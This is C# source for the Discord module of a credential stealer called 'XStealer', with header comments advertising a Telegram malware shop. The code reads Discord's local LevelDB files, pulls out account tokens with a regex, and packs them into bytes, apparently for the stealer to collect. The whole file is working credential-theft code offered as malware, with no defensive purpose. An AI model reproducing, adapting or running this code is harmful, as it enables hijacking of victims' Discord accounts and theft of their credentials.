// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps.Discord
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using System.Text.RegularExpressions;
    using Helpers;

    public static class Tokens
    {
        /// <summary>
        /// <br><b>RUS</b></br><br>Коллекция для удаления дубликатов</br>
        /// <br><b>ENG</b></br><br>Collection for removing duplicates</br>
        /// </summary>
        private static readonly HashSet<string> data = new HashSet<string>(StringComparer.InvariantCultureIgnoreCase);

        /// <summary>
        /// <br><b>RUS</b></br><br>Метод для записи найденных токенов дискорда в файл</br>
        /// <br><b>ENG</b></br><br>Method for writing found discord tokens to a file</br>
        /// </summary>
        private static IEnumerable<string> GetTokens()
        {
            string result = string.Empty;

            // Список всех баз ldb
            List<string> ldbfiles = GetDataBase();

            if (ldbfiles.Any()) // Проверяем что список не пустой // ldbfiles.Count > 0
            {
                foreach (string token in ldbfiles) // Проходимся по списку
                {
                    try
                    {
                        // Находим токен по регулярке
                        // Доп регулярка: [^\"]*
                        // string[] tokens = Regex.Matches(token, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.IgnoreCase).Cast<Match>().Select(m => m.Value).Distinct().OrderBy(s => s).ToArray();
                        foreach (string match in Regex.Matches(token, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.IgnoreCase).OfType<Match>().Select(m => m.Value).Distinct().Where(match => match.Length == 59))
                        {
                            // Добавляем данные в список
                            data.Add($"{match?.ToString()}\r\n"); // Tokens:
                        }
                    }
                    catch { continue; }
                }
            }
            return data?.Distinct();
        }

        /// <summary>
        /// <br><b>RUS</b></br><br>Метод для сбора всех баз ldb из нашей папки</br>
        /// <br><b>ENG</b></br><br>Method for collecting all ldb databases from our folder</br>
        /// </summary>
        /// <returns></returns>
        private static List<string> GetDataBase()
        {
            var ldbFiles = new List<string>(); // Список куда сохраняем все найденны файлы ldb
            // Проверяем что наша папка существует 
            if (Directory.Exists(GlobalPaths.DiscordPath))
            {
                try
                {
                    // Проходимся по нашей папке
                    foreach (string file in Directory.EnumerateFiles(GlobalPaths.DiscordPath, "*.ldb", SearchOption.AllDirectories))
                    {
                        try
                        {
                            // Читаем каждый файл ldb
                            string rawText = File.ReadAllText(file);
                            // Если находим строку oken
                            if (rawText.Contains("oken"))
                            {
                                ldbFiles.Add(rawText); // Добавляем файл в список
                            }
                        }
                        catch { continue; }
                    }
                }
                catch { }
            }
            return ldbFiles; // Возвращаем список всех файлов ldb
        }

        /// <summary>
        /// <br><b>RUS</b></br><br>Метод для вывода токенов в массив байт</br>
        /// <br><b>ENG</b></br><br>Method for outputting tokens to a byte array</br>
        /// </summary>
        /// <returns></returns>
        public static byte[] GetData()
        {
            byte[] result = new byte[4000];
            // Перебираем токены
            foreach (string list in GetTokens())
            {
                result = ConverterEx.ToBytes(false, list);
            }
            return result;
        }
    }
}